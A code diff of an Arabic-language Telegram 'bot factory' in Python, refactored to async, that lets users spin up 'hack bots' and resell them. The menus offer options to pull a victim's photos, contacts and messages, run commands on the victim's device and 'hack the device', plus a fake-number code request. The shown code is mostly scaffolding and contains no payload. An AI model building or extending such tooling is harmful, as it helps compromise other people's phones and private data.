             [InlineKeyboardButton("زخرفة الأسماء 🗿", callback_data="user_button_name_decorate")],
-            [InlineKeyboardButton("صيد يوزرات تليجرام 💍", callback_data="telegram_usernames_menu")],
-            [InlineKeyboardButton("تواصل مع الم개발 👨‍🎓", url=f"tg://user?id={admin_id}")]
+            [InlineKeyboardButton("صيد يوزرات 💍", callback_data="telegram_usernames_menu")],
+            [InlineKeyboardButton("تواصل مع المطور 👨‍🎓", url=f"tg://user?id={admin_id}")]
         ]
         if bot_settings.get("custom_buttons_enabled_by_admin", False):
             for btn in bot_settings["custom_buttons"]:
@@ -721,38 +675,35 @@ def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
                     keyboard.append([InlineKeyboardButton(btn["name"], url=btn["value"])])
                 elif btn["type"] == "send_message":
                     keyboard.append([InlineKeyboardButton(btn["name"], callback_data=f"custom_msg_btn_{btn['name']}")])
-
     elif bot_type == "encryption_bot":
         keyboard = [
             [InlineKeyboardButton("تشفير ملفات 🔒", callback_data="encrypt_file")],
             [InlineKeyboardButton("فك تشفير ملفات 🔓", callback_data="decrypt_file")],
             [InlineKeyboardButton("الدعم 🚨", url=f"tg://user?id={admin_id}")],
-            [InlineKeyboardButton("الشروط و المتطلبات 📜", callback_data="show_terms_encryption_bot")]
+            [InlineKeyboardButton("الشروط 📜", callback_data="show_terms_encryption_bot")]
         ]
         if bot_settings.get("main_channel_link"):
             keyboard.append([InlineKeyboardButton("القناة الأساسية 🫅", url=bot_settings["main_channel_link"])])
-
     elif bot_type == "factory_bot":
         keyboard = [
             [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
-            [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
+            [InlineKeyboardButton("🔐 بوت تشفير", callback_data="create_encryption_bot_sub")]
         ]
-
     return InlineKeyboardMarkup(keyboard)
 
 
-def get_full_phone_hack_keyboard(bot_username, user_id):
+def get_full_phone_hack_keyboard():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("سحب جميع صور الهاتف 🔒", callback_data="full_phone_hack_photos")],
-        [InlineKeyboardButton("سحب جميع ارقام الضحية 🔒", callback_data="full_phone_hack_contacts")],
-        [InlineKeyboardButton("سحب جميع رسائل الضحية 🔒", callback_data="full_phone_hack_messages")],
-        [InlineKeyboardButton("تنفيذ الأوامر على جهاز الضحية 🔒", callback_data="full_phone_hack_commands")],
-        [InlineKeyboardButton("اختراق جهاز الضحية 🔒", callback_data="full_phone_hack_device")],
+        [InlineKeyboardButton("سحب الصور 🔒", callback_data="full_phone_hack_photos")],
+        [InlineKeyboardButton("سحب الأرقام 🔒", callback_data="full_phone_hack_contacts")],
+        [InlineKeyboardButton("سحب الرسائل 🔒", callback_data="full_phone_hack_messages")],
+        [InlineKeyboardButton("تنفيذ أوامر 🔒", callback_data="full_phone_hack_commands")],
+        [InlineKeyboardButton("اختراق الجهاز 🔒", callback_data="full_phone_hack_device")],
         [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
     ])
 
 
-def get_fake_number_keyboard(bot_username, user_id):
+def get_fake_number_keyboard():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("طلب كود 💬", callback_data="fake_number_request_code")],
         [InlineKeyboardButton("تغيير الرقم 🔄", callback_data="fake_number_change_number")]
@@ -760,224 +711,160 @@ def get_fake_number_keyboard(bot_username, user_id):
 
 
 # =============================================
-# وظائف البحث عن يوزرات تليجرام
-# =============================================
-
-def check_username_availability(bot_token, username):
-    try:
-        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id=@{username}").json()
-        if resp.get("ok"):
-            return False
-        elif resp.get("error_code") == 400 and "chat not found" in resp.get("description", "").lower():
-            return True
-        return False
-    except Exception as e:
-        logging.error(f"Error checking username availability: {e}")
-        return False
-
-
-def generate_and_check_username(bot_token, username_type):
-    chars = string.ascii_lowercase + string.digits
-    for _ in range(50):
-        username = ""
-        if username_type == "single_type":
-            char = random.choice(string.ascii_lowercase)
-            username = char * 4
-        elif username_type == "quad_usernames":
-            username = ''.join(random.choice(chars) for _ in range(4))
-        elif username_type == "semi_quad":
-            parts = [random.choice(chars) for _ in range(3)]
-            username = f"{parts[0]}{parts[1]}_{parts[2]}" if random.choice([True, False]) else f"{parts[0]}_{parts[1]}{parts[2]}"
-        elif username_type == "semi_triple":
-            parts = [random.choice(chars) for _ in range(2)]
-            username = f"{parts[0]}_{parts[1]}"
-        elif username_type == "random":
-            length = random.randint(4, 8)
-            username = ''.join(random.choice(chars) for _ in range(length))
-        elif username_type == "unique":
-            patterns = [
-                lambda: ''.join(random.choice(string.ascii_lowercase) for _ in range(4)),
-                lambda: ''.join(random.choice(string.digits) for _ in range(4)),
-                lambda: random.choice(string.ascii_lowercase) * 3 + random.choice(string.digits),
-                lambda: random.choice(string.ascii_lowercase) + random.choice(string.digits) * 3,
-            ]
-            username = random.choice(patterns)()
-        if check_username_availability(bot_token, username):
-            return username
-        time.sleep(0.1)
-    return None
-
-
-# =============================================
 # تشغيل البوتات المصنوعة
 # =============================================
 
 def run_made_bot(bot_token, admin_id, bot_username, bot_type):
+    import asyncio
     try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         made_app = ApplicationBuilder().token(bot_token).build()
         made_app.add_handler(CommandHandler("start", start_made_bot))
         made_app.add_handler(CallbackQueryHandler(handle_callback_query_made_bot))
         made_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_made_bot))
         made_app.add_handler(MessageHandler(filters.Document.ALL, handle_document_made_bot))
         logging.info(f"Starting made bot @{bot_username}...")
-        made_app.run_polling(drop_pending_updates=True)
-        return made_app
+        loop.run_until_complete(made_app.run_polling(drop_pending_updates=True))
     except Exception as e:
         logging.error(f"Error running made bot @{bot_username}: {e}")
-        return None
 
 
 # =============================================
 # handlers البوت الرئيسي
 # =============================================
 
-def start_main_bot(update: Update, context: CallbackContext):
+async def start_main_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in FACTORY_ADMINS:
-        send_message(context.bot, user_id,
-                     "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @RLH55\nقناة المطور: @ln_bio",
+        await send_msg(context.bot, user_id,
+                     "حياك الله في بوت صانع البوتات (وضع الأدمن)\n\nالمطور: @RLH55",
                      reply_markup=get_main_bot_admin_keyboard())
         user_state[user_id] = None
         return
     if check_subscription(user_id, MAIN_CHANNELS, MAIN_BOT_TOKEN):
-        send_message(context.bot, user_id,
-                     "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @RLH55\nقناة المطور: @RLH5500",
+        await send_msg(context.bot, user_id,
+                     "حياك الله في بوت صانع البوتات\n\nالمطور: @RLH55",
                      reply_markup=get_main_bot_user_keyboard())
         user_state[user_id] = None
     else:
-        msg = "❌ يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:\n\n"
+        msg = "يجب الاشتراك في القنوات التالية:\n\n"
         for channel in MAIN_CHANNELS:
             msg += f"🔗 {channel}\n"
-        msg += "\nبعد الاشتراك، أرسل /start مرة أخرى."
-        update.message.reply_text(msg)
+        msg += "\nبعد الاشتراك أرسل /start"
+        await update.message.reply_text(msg)
 
 
-def create_bot_main_bot(update: Update, context: CallbackContext):
+async def create_bot_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
+    await query.answer()
     keyboard = [
         [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot")],
         [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot")],
         [InlineKeyboardButton("🎩 مصنع بوتات", callback_data="create_factory_bot")]
     ]
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "اختر نوع البوت الذي تريد إنشاءه:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
     user_state[query.from_user.id] = "await_bot_type_selection"
 
 
-def create_hack_bot_main_bot(update: Update, context: CallbackContext):
+async def create_hack_bot_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت اختراق'.")
+    await query.answer()
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "أرسل توكن البوت من BotFather لنوع بوت اختراق:")
     user_state[query.from_user.id] = {"action": "await_token", "bot_type": "hack_bot"}
 
 
-def create_encryption_bot_main_bot(update: Update, context: CallbackContext):
+async def create_encryption_bot_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت تشفير py'.")
+    await query.answer()
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "أرسل توكن البوت من BotFather لنوع بوت تشفير:")
     user_state[query.from_user.id] = {"action": "await_token", "bot_type": "encryption_bot"}
 
 
-def create_factory_bot_main_bot(update: Update, context: CallbackContext):
+async def create_factory_bot_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
+    await query.answer()
     user_id = query.from_user.id
     if FACTORY_MAIN_SUBSCRIPTION_ENABLED and not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
-        msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لإنشاء مصنع بوتات."
-        keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
-        edit_message_text(context.bot, query.message.chat.id, query.message.message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
+        msg = f"يجب الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
+        keyboard = [[InlineKeyboardButton("اشترك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
+        await edit_msg(context.bot, query.message.chat.id, query.message.message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
         user_state[user_id] = None
         return
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'مصنع بوتات'.")
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "أرسل توكن البوت من BotFather لنوع مصنع بوتات:")
     user_state[user_id] = {"action": "await_token", "bot_type": "factory_bot"}
 
 
-def manage_bots_main_bot(update: Update, context: CallbackContext):
+async def manage_bots_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
+    await query.answer()
     user_id = query.from_user.id
     bots = created_bots.get(user_id, [])
     if not bots:
-        edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                          "⚠️ ليس لديك أي بوتات حتى الآن.")
+        await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "ليس لديك بوتات حتى الآن.")
         return
     keyboard = []
     for bot_data in bots:
         keyboard.append([InlineKeyboardButton(f"🤖 {bot_data['username']} ({bot_data['bot_type']})", callback_data=f"info_{bot_data['username']}")])
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "اختر البوت الذي تريد إدارته:", reply_markup=InlineKeyboardMarkup(keyboard))
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "اختر البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
     user_state[user_id] = "manage_bots"
 
 
-def bot_info_main_bot(update: Update, context: CallbackContext):
+async def bot_info_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
+    await query.answer()
     username = query.data.split("_", 1)[1]
     keyboard = [[InlineKeyboardButton("🗑 حذف البوت", callback_data=f"delete_{username}")]]
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      f"معلومات البوت @{username}", reply_markup=InlineKeyboardMarkup(keyboard))
-    user_state[user_id] = f"confirm_delete_{username}"
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, f"معلومات @{username}", reply_markup=InlineKeyboardMarkup(keyboard))
+    user_state[query.from_user.id] = f"confirm_delete_{username}"
 
 
-def delete_bot_main_bot(update: Update, context: CallbackContext):
+async def delete_bot_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
+    await query.answer()
     username = query.data.split("_", 1)[1]
-    user_state[user_id] = f"confirm_delete_{username}"
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      f"⚠️ هل أنت متأكد من حذف البوت @{username}؟\nأرسل:\n`delete {username}`",
-                      parse_mode=ParseMode.MARKDOWN)
+    user_state[query.from_user.id] = f"confirm_delete_{username}"
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  f"هل متأكد من حذف @{username}؟\nأرسل: delete {username}",
+                  parse_mode=ParseMode.MARKDOWN)
 
 
-def add_factory_admin_main_bot(update: Update, context: CallbackContext):
+async def add_factory_admin_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
-    if user_id != MAIN_ADMIN_ID:
-        query.answer("🚫 ليس لديك صلاحية.", show_alert=True)
+    await query.answer()
+    if query.from_user.id != MAIN_ADMIN_ID:
+        await query.answer("ليس لديك صلاحية.", show_alert=True)
         return
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "أرسل معرف (ID) المستخدم الذي تريد إضافته كأدمن:")
-    user_state[user_id] = "await_new_factory_admin_id"
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "أرسل معرف المستخدم:")
+    user_state[query.from_user.id] = "await_new_factory_admin_id"
 
 
-def remove_factory_admin_main_bot(update: Update, context: CallbackContext):
+async def remove_factory_admin_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
-    if user_id != MAIN_ADMIN_ID:
-        query.answer("🚫 ليس لديك صلاحية.", show_alert=True)
+    await query.answer()
+    if query.from_user.id != MAIN_ADMIN_ID:
+        await query.answer("ليس لديك صلاحية.", show_alert=True)
         return
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "أرسل معرف (ID) المستخدم الذي تريد حذفه:")
-    user_state[user_id] = "await_remove_factory_admin_id"
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id, "أرسل معرف المستخدم للحذف:")
+    user_state[query.from_user.id] = "await_remove_factory_admin_id"
 
 
-def factory_stats_main_bot(update: Update, context: CallbackContext):
+async def factory_stats_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
+    await query.answer()
     total_bots = sum(len(bots) for bots in created_bots.values())
-    total_users = 0
-    for bot_username in made_bot_data:
-        total_users += len(made_bot_data[bot_username].get("members", []))
-    stats = (
-        f"📊 *إحصائيات المصنع:*\n"
-        f"🤖 عدد البوتات: {total_bots}\n"
-        f"👥 إجمالي المستخدمين: {total_users}\n"
-        f"👨‍💻 عدد الأدمنز: {len(FACTORY_ADMINS)}"
-    )
-    send_message(context.bot, query.message.chat.id, stats, parse_mode=ParseMode.MARKDOWN)
+    total_users = sum(len(made_bot_data.get(b, {}).get("members", [])) for b in made_bot_data)
+    stats = f"📊 إحصائيات المصنع:\n🤖 البوتات: {total_bots}\n👥 المستخدمين: {total_users}\n👨‍💻 الأدمنز: {len(FACTORY_ADMINS)}"
+    await send_msg(context.bot, query.message.chat.id, stats)
 
 
-def stop_all_bots_main_bot(update: Update, context: CallbackContext):
+async def stop_all_bots_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer("جاري إيقاف جميع البوتات...", show_alert=True)
+    await query.answer("جاري الإيقاف...", show_alert=True)
     action_taken = False
     for bot_username, updater_instance in list(running_made_bot_updaters.items()):
         try:
@@ -986,15 +873,13 @@ def stop_all_bots_main_bot(update: Update, context: CallbackContext):
             action_taken = True
         except Exception as e:
             logging.error(f"Error stopping bot @{bot_username}: {e}")
-    if action_taken:
-        send_message(context.bot, query.message.chat.id, "✅ تم إيقاف جميع البوتات.")
-    else:
-        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات قيد التشغيل.")
+    msg = "تم إيقاف جميع البوتات." if action_taken else "لا توجد بوتات قيد التشغيل."
+    await send_msg(context.bot, query.message.chat.id, msg)
 
 
-def start_all_bots_main_bot(update: Update, context: CallbackContext):
+async def start_all_bots_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer("جاري إعادة تشغيل جميع البوتات...", show_alert=True)
+    await query.answer("جاري التشغيل...", show_alert=True)
     action_taken = False
     for admin_id_key, bots_list in created_bots.items():
         for bot_info_item in bots_list:
@@ -1009,65 +894,60 @@ def start_all_bots_main_bot(update: Update, context: CallbackContext):
                     action_taken = True
                 except Exception as e:
                     logging.error(f"Error restarting bot @{bot_username}: {e}")
-    if action_taken:
-        send_message(context.bot, query.message.chat.id, "✅ جاري إعادة تشغيل البوتات.")
-    else:
-        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات لإعادة تشغيلها.")
+    msg = "جاري إعادة تشغيل البوتات." if action_taken else "لا توجد بوتات."
+    await send_msg(context.bot, query.message.chat.id, msg)
 
 
-def broadcast_free_bots_main_bot(update: Update, context: CallbackContext):
+async def broadcast_free_bots_main_bot(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
-    user_id = query.from_user.id
-    send_message(context.bot, query.message.chat.id, "أرسل الرسالة التي تريد إذاعتها:")
-    user_state[user_id] = "await_broadcast_free_bots_message"
+    await query.answer()
+    await send_msg(context.bot, query.message.chat.id, "أرسل الرسالة للإذاعة:")
+    user_state[query.from_user.id] = "await_broadcast_free_bots_message"
 
 
-def add_factory_main_subscription(update: Update, context: CallbackContext):
+async def add_factory_main_subscription(update: Update, context: CallbackContext):
     global FACTORY_MAIN_SUBSCRIPTION_ENABLED
     query = update.callback_query
-    query.answer("جاري تفعيل الاشتراك الإجباري...", show_alert=True)
+    await query.answer("جاري التفعيل...", show_alert=True)
     FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
     for bot_username in made_bot_data:
         load_made_bot_settings(bot_username)
         if FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[bot_username]["channels"]:
             made_bot_data[bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
             save_made_bot_settings(bot_username)
-    send_message(context.bot, query.message.chat.id, "✅ تم تفعيل الاشتراك الإجباري لقناة المصنع.")
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن)",
-                      reply_markup=get_main_bot_admin_keyboard())
+    await send_msg(context.bot, query.message.chat.id, "تم تفعيل الاشتراك الإجباري.")
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "حياك الله (وضع الأدمن)", reply_markup=get_main_bot_admin_keyboard())
 
 
-def remove_factory_main_subscription(update: Update, context: CallbackContext):
+async def remove_factory_main_subscription(update: Update, context: CallbackContext):
     global FACTORY_MAIN_SUBSCRIPTION_ENABLED
     query = update.callback_query
-    query.answer("جاري إزالة الاشتراك الإجباري...", show_alert=True)
+    await query.answer("جاري الإزالة...", show_alert=True)
     FACTORY_MAIN_SUBSCRIPTION_ENABLED = False
     for bot_username in made_bot_data:
         load_made_bot_settings(bot_username)
         if FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[bot_username]["channels"]:
             made_bot_data[bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
             save_made_bot_settings(bot_username)
-    send_message(context.bot, query.message.chat.id, "✅ تم إزالة الاشتراك الإجباري لقناة المصنع.")
-    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
-                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن)",
-                      reply_markup=get_main_bot_admin_keyboard())
+    await send_msg(context.bot, query.message.chat.id, "تم إزالة الاشتراك الإجباري.")
+    await edit_msg(context.bot, query.message.chat.id, query.message.message_id,
+                  "حياك الله (وضع الأدمن)", reply_markup=get_main_bot_admin_keyboard())
 
 
-def handle_message_main_bot(update: Update, context: CallbackContext):
+async def handle_message_main_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     state = user_state.get(user_id)
     text = update.message.text.strip()
 
     if isinstance(state, dict) and state.get("action") == "await_token":
-        send_message(context.bot, update.message.chat.id, "⏳ جاري إعداد البوت...")
+        await send_msg(context.bot, update.message.chat.id, "جاري إعداد البوت...")
         bot_token = text
         bot_type = state["bot_type"]
         try:
             bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
             if not bot_info_resp.get("ok"):
-                send_message(context.bot, update.message.chat.id, "❌ التوكن غير صالح.")
+                await send_msg(context.bot, update.message.chat.id, "التوكن غير صالح.")
                 user_state[user_id] = None
                 return
             bot_username = bot_info_resp["result"]["username"]
@@ -1077,21 +957,16 @@ def handle_message_main_bot(update: Update, context: CallbackContext):
             bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
             with open(bot_data_file, 'w') as f:
                 json.dump({"token": bot_token, "admin_id": user_id, "bot_type": bot_type}, f)
-            send_message(context.bot, update.message.chat.id, f"✅ تم تشغيل البوت @{bot_username} بنجاح!")
+            await send_msg(context.bot, update.message.chat.id, f"تم تشغيل @{bot_username} بنجاح!")
             user_state[user_id] = None
             if user_id != MAIN_ADMIN_ID:
                 creator_name = update.effective_user.first_name
-                send_message(context.bot, MAIN_ADMIN_ID,
-                             f"🔔 *بوت جديد!*\n👤 [{creator_name}](tg://user?id={user_id})\n🤖 @{bot_username} ({bot_type})",
-                             parse_mode=ParseMode.MARKDOWN)
-            threading.Thread(
-                target=run_made_bot,
-                args=(bot_token, user_id, bot_username, bot_type),
-                daemon=True
-            ).start()
+                await send_msg(context.bot, MAIN_ADMIN_ID,
+                             f"🔔 بوت جديد!\n👤 {creator_name}\n🤖 @{bot_username} ({bot_type})")
+            threading.Thread(target=run_made_bot, args=(bot_token, user_id, bot_username, bot_type), daemon=True).start()
         except Exception as e:
             logging.error(f"Error setting up bot: {e}")
-            send_message(context.bot, update.message.chat.id, "❌ حدث خطأ أثناء إعداد البوت.")
+            await send_msg(context.bot, update.message.chat.id, "حدث خطأ.")
             user_state[user_id] = None
         return
 
@@ -1100,19 +975,16 @@ def handle_message_main_bot(update: Update, context: CallbackContext):
         if text == f"delete {username_to_delete}":
             bots = created_bots.get(user_id, [])
             created_bots[user_id] = [b for b in bots if b["username"] != username_to_delete]
-            bot_data_file = os.path.join(DATABASE_DIR, f"{username_to_delete}.json")
-            if os.path.exists(bot_data_file):
-                os.remove(bot_data_file)
-            settings_file = os.path.join(DATABASE_DIR, f"{username_to_delete}_settings.json")
-            if os.path.exists(settings_file):
-                os.remove(settings_file)
+            for fname in [f"{username_to_delete}.json", f"{username_to_delete}_settings.json"]:
+                fpath = os.path.join(DATABASE_DIR, fname)
+                if os.path.exists(fpath):
+                    os.remove(fpath)
             if username_to_delete in running_made_bot_updaters:
                 running_made_bot_updaters[username_to_delete].stop()
                 del running_made_bot_updaters[username_to_delete]
-            user_state[user_id] = None
-            send_message(context.bot, update.message.chat.id, f"✅ تم حذف البوت @{username_to_delete}.")
+            await send_msg(context.bot, update.message.chat.id, f"تم حذف @{username_to_delete}.")
         else:
-            send_message(context.bot, update.message.chat.id, "❌ أمر الحذف غير صحيح.")
+            await send_msg(context.bot, update.message.chat.id, "أمر الحذف غير صحيح.")
         user_state[user_id] = None
         return
 
@@ -1122,11 +994,11 @@ def handle_message_main_bot(update: Update, context: CallbackContext):
                 new_admin_id = int(text)
                 if new_admin_id not in FACTORY_ADMINS:
                     FACTORY_ADMINS.append(new_admin_id)
-                    send_message(context.bot, update.message.chat.id, f"✅ تم إضافة {new_admin_id} كأدمن.")
+                    await send_msg(context.bot, update.message.chat.id, f"تم إضافة {new_admin_id} كأدمن.")
                 else:
-                    send_message(context.bot, update.message.chat.id, "هذا المستخدم أدمن بالفعل.")
+                    await send_msg(context.bot, update.message.chat.id, "أدمن بالفعل.")
             except ValueError:
-                send_message(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
+                await send_msg(context.bot, update.message.chat.id, "معرف غير صالح.")
             user_state[user_id] = None
             return
 
@@ -1134,19 +1006,18 @@ def handle_message_main_bot(update: Update, context: CallbackContext):
             try:
                 admin_to_remove_id = int(text)
                 if admin_to_remove_id == MAIN_ADMIN_ID:
-                    send_message(context.bot, update.message.chat.id, "❌ لا يمكن حذف المالك الرئيسي.")
+                    await send_msg(context.bot, update.message.chat.id, "لا يمكن حذف المالك.")
                 elif admin_to_remove_id in FACTORY_ADMINS:
                     FACTORY_ADMINS.remove(admin_to_remove_id)
-                    send_message(context.bot, update.message.chat.id, f"✅ تم حذف {admin_to_remove_id}.")
+                    await send_msg(context.bot, update.message.chat.id, f"تم حذف {admin_to_remove_id}.")
                 else:
-                    send_message(context.bot, update.message.chat.id, "هذا المستخدم ليس أدمن.")
+                    await send_msg(context.bot, update.message.chat.id, "ليس أدمن.")
             except ValueError:
-                send_message(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
+                await send_msg(context.bot, update.message.chat.id, "معرف غير صالح.")
             user_state[user_id] = None
             return
 
         if state == "await_broadcast_free_bots_message":
-            broadcast_message = text
             sent_count = 0
             for admin_id_key, bots_list in created_bots.items():
                 for bot_info_item in bots_list:
@@ -1156,26 +1027,26 @@ def handle_message_main_bot(update: Update, context: CallbackContext):
                     if bot_settings["payment_status"] == "free":
                         for member_id in bot_settings.get("members", []):
                             try:
-                                requests.get(f"https://api.telegram.org/bot{bot_info_item['token']}/sendMessage?chat_id={member_id}&text={urllib.parse.quote(broadcast_message)}")
+                                requests.get(f"https://api.telegram.org/bot{bot_info_item['token']}/sendMessage?chat_id={member_id}&text={urllib.parse.quote(text)}")
                                 sent_count += 1
                             except:
                                 pass
-            send_message(context.bot, update.message.chat.id, f"✅ تم إرسال الإذاعة.\nالمرسلة: {sent_count}")
+            await send_msg(context.bot, update.message.chat.id, f"تم الإذاعة إلى {sent_count} عضو.")
             user_state[user_id] = None
             return
 
 
 # =============================================
-# start_made_bot - البوتات المصنوعة
+# start_made_bot
 # =============================================
 
-def start_made_bot(update: Update, context: CallbackContext):
+async def start_made_bot(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     current_bot_token = context.bot.token
     current_bot_username = get_bot_username_from_token(current_bot_token)
     if not current_bot_username:
-        send_message(context.bot, chat_id, "حدث خطأ. يرجى المحاولة لاحقًا.")
+        await send_msg(context.bot, chat_id, "حدث خطأ.")
         return
 
     admin_id = get_bot_admin_id(current_bot_username)
@@ -1192,40 +1063,37 @@ def start_made_bot(update: Update, context: CallbackContext):
     user_last_interaction_time[current_bot_username][user_id] = time.time()
 
     if user_id in bot_settings["banned_users"]:
-        send_message(context.bot, chat_id, "أنت محظور من قبل المطور.")
+        await send_msg(context.bot, chat_id, "أنت محظور.")
         return
 
     if bot_settings["bot_status"] == "off" and user_id != admin_id:
-        send_message(context.bot, chat_id, "البوت متوقف حاليا.")
+        await send_msg(context.bot, chat_id, "البوت متوقف.")
         return
 
     if bot_settings["payment_status"] == "on" and user_id not in bot_settings["paid_users"] and user_id != admin_id:
-        send_message(context.bot, chat_id, "للاستخدام الكامل يرجى شراء الاشتراك.",
-                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("شراء الاشتراك", url=f"tg://user?id={admin_id}")]]))
+        await send_msg(context.bot, chat_id, "يرجى شراء الاشتراك.",
+                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("شراء", url=f"tg://user?id={admin_id}")]]))
         return
 
     if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
         if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
-            msg = f"❌ يجب عليك الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
+            msg = f"يجب الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
             keyboard = [[InlineKeyboardButton("اشترك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
-            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
+            await send_msg(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
             return
 
     required_channels = [c for c in bot_settings["channels"] if c != FACTORY_MAIN_SUBSCRIPTION_CHANNEL]
     if required_channels:
-        not_subscribed = []
-        for channel in required_channels:
-            if not check_subscription(user_id, [channel], current_bot_token):
-                not_subscribed.append(channel)
+        not_subscribed = [ch for ch in required_channels if not check_subscription(user_id, [ch], current_bot_token)]
         if not_subscribed:
-            msg = "يجب الاشتراك في القنوات التالية:\n\n"
+            msg = "يجب الاشتراك في القنوات:\n\n"
             keyboard = []
             for ch in not_subscribed:
                 ch_name = get_channel_name(ch, current_bot_token)
                 keyboard.append([InlineKeyboardButton(f"اشترك: {ch_name}", url=f"https://t.me/{ch.lstrip('@')}")])
                 msg += f"{ch_name}\n"
-            msg += "\nبعد الاشتراك أرسل /start"
-            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
+            msg += "\nأرسل /start بعد الاشتراك"
+            await send_msg(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
             return
 
     members = bot_settings["members"]
